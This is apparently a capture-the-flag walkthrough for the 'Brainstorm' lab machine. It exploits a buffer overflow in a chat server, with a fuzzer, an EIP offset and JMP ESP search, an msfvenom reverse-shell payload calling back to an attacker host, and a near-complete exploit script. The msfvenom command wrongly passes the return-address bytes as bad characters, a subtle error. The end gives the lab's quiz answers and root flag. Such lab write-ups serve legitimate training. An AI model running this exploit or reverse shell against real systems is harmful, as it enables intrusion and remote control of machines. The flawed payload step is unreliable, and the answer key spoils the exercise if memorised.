# Brainstorm - Medium

```shell
nmap -T4 -p- -A -Pn -v 10.10.3.116

ftp 10.10.3.116
#anonymous login

ls -la
#it gets stuck at 'entering extended passive mode'
#Ctrl+C to stop it

passive
#passive mode is off now

ls -la
#cannot open in ASCII mode

binary
#switch to binary mode

ls -la

cd chatserver

ls -la
#we have two files

mget *
#now we can check these files

nc 10.10.3.116 9999
#we can interact with the chatserver

#we can try to reverse-engineer chatserver.exe

python3 -m http.server
#in windows machine, download the files by visiting the link

#run chatserver.exe in Immunity Debugger

vim fuzzer.py

python3 fuzzer.py
#fuzzer breaks at 2400 bytes

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2800
#generate payload to find EIP offset

vim exploit.py

#restart chatserver.exe in Immunity Debugger
#do it everytime before running exploit

python3 exploit.py
#run exploit
#we get EIP offset 2012 on running mona command

vim exploit.py
#edit values to offset=2012 and retn="BBBB"

python3 exploit.py
#we get 42424242 in EIP register

#generate bytearray using mona

#generate badchars
python3 badchars.py

#copy badchars output to payload variable in exploit script
#and run exploit again
python3 exploit.py
#note the ESP register value, and use it in mona command

#this gives us 'unmodified' message
#which means only nullbyte is badchar

#we can check essfunc.dll using mona
#and search for jump point

#after finding jump point, we have to generate shellcode
#using msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.31.212 LPORT=4444 EXITFUNC=thread -b "\xdf\x14\x50\x62" -f c

#copy shellcode to payload variable value in exploit script
#edit exploit to include victim ip instead of windows ip
#retn variable should have value of jump point address
#add padding as well
vim exploit.py

nc -nvlp 4444
#setup listener

python3 exploit.py
#run exploit against target machine
#we get reverse shell as root on listener
```

* Open ports & services:

  * 21 - ftp
  * 3389 - ssl/ms-wbt-server
  * 9999 - abyss

* We can start with ftp enumeration; anonymous login is allowed.

* After turning passive mode off and switching to binary mode, we can see that we have two files - chatserver.exe and essfunc.dll - we can take a look at both these files.

* We can try to enumerate port 9999 - using netcat, we can interact with it by entering our username and messages.

* The service on port 9999 behaves like a chatserver, and given the clue, it is possible that the .exe and .dll files are related to the chatserver service.

* We can now attempt to reverse-engineer chatserver.exe with the help of Immunity Debugger (in Windows machine).

* After transferring the files, we can run Immunity Debugger as Administrator and run chatserver.exe

* In the command box in Immunity Debugger, run this command:

  ```!mona config -set workingfolder c:\mona\%p```

* We can now go ahead and create ```fuzzer.py``` in Kali, which will send the username and message to chatserver.exe:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.30.139"
#ip of windows machine with debugger

port = 9999
timeout = 5
username = "dummy"
string = "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.send(bytes(username, "latin-1"))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

* On running the fuzzer, we can see that it breaks at 2400 bytes.

* Now, we need to generate a payload to be used in ```exploit.py``` - we have to generate the pattern of size 2400 bytes + 400 bytes = 2800 bytes.

* We can now create ```exploit.py```:

```python
import socket

ip = "192.168.30.139"
#windows machine ip
port = 9999
username = "dummy"
prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
#insert 2800 bytes generated payload here
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(username + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

* Now, always restart chatserver in Immunity Debugger before running the exploit script - running the exploit crashes the program.

* In the command box in the debugger, we can run the following command:

  ```!mona findmsp -distance 2400```

* This gives us the EIP offset with the message ```EIP contains normal pattern``` - we have EIP offset 2012.

* As a proof of concept, in the exploit script, we can edit values of offset to 2012 and retn to "BBBB" - now the EIP register is filled with 42424242 - so it works.

* We have to generate bytearray using mona now:

  ```!mona bytearray -b "\x00"```

* We have to generate a list of badchars similar to bytearray using another script:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

* Copy the output of the badchars script and paste it as value of payload variable in the exploit script, and run it again.

* This time, in order to find badchars, we need to run mona command which includes the ESP register value:

  ```!mona compare -f C:\mona\chatserver\bytearray.bin -a 00DFEEA8```

* In the comparison window we can see the message 'unmodified' - this means only nullbyte (\x00) is badchar.

* Now, we need to find a file inside .exe without memory protection mechanisms such as ASLR and DEP - we have the essfunc.dll file as well.

* So, we can check this using:

  ```!mona modules```

* The output shows modules of .exe - we have to look for .dll file with all properties as 'False', and essfunc.dll has all values as 'False'.

* Now, we can check for jump point in essfunc.dll:

  ```!mona jmp -r esp -m essfunc.dll```

* We get 9 pointers - we can try for the first one '625014DF'

* As it is a x86 system, it uses little-endian system, and therefore the address would be "\xdf\x14\x50\x62"

* Now, we need to generate payload using ```msfvenom``` - the jump point address is used here.

* This generates shellcode, which has to be substituted as the value for payload variable in exploit script.

* In the exploit script, modify the IP from Windows machine to victim machine, and the retn variable with the jump point address.

* Also, in exploit script, modify the padding value to include ```"\x90" * 16```

* Final exploit script:

```python
import socket

ip = "10.10.3.116"
port = 9999
username = "dummy"
prefix = ""
offset = 2012
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16
payload = ""
#insert shellcode in payload, enclosed in brackets
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(username + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

* Setup netcat listener, and run the exploit script against the victim machine; this gives us reverse shell as root - root flag can be found in drake's Desktop.

```markdown
1. How many ports are open? - 6 (actual answer is 3, but accepted answer is 6)

2. What is the name of the exe file you found? - chatserver.exe

3. After gaining access, what is the content of the root.txt file? - 5b1001de5a44eca47eee71e7942a8f8a
```
